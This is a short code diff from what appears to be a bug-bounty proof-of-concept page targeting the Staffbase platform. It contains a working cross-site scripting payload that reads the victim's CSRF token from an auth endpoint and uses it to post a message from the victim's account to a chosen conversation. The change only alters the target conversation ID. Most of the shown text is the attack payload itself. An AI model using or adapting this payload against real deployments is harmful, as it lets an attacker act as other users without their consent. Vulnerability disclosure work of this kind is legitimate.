@@ -26,7 +26,7 @@
         });
 
         function executeXSS() {
-            var code = `(async()=>{try{var t=(await(await fetch('/auth/discover',{headers:{'Accept':'application/vnd.staffbase.auth.discovery.v2+json'}})).json()).csrfToken;await fetch('/api/installations/695f4cd124eb235aea87a3a4/conversations/direct/695f4cd124eb235aea87a3a4',{method:'POST',headers:{'content-type':'application/json','x-csrf-token':t},body:JSON.stringify({message:'H1 Triage: Integrity Violation PoC'})});alert('Integrity Violation Successful: Message sent using CSRF token '+t)}catch(e){alert('Error: '+e.message)}})()`;
+            var code = `(async()=>{try{var t=(await(await fetch('/auth/discover',{headers:{'Accept':'application/vnd.staffbase.auth.discovery.v2+json'}})).json()).csrfToken;await fetch('/api/installations/695f4cd124eb235aea87a3a4/conversations/direct/696e680de818c03dad299122',{method:'POST',headers:{'content-type':'application/json','x-csrf-token':t},body:JSON.stringify({message:'H1 Triage: Integrity Violation PoC'})});alert('Integrity Violation Successful: Message sent using CSRF token '+t)}catch(e){alert('Error: '+e.message)}})()`;
 
             var exploitMessage = {
                 command: "navigate",
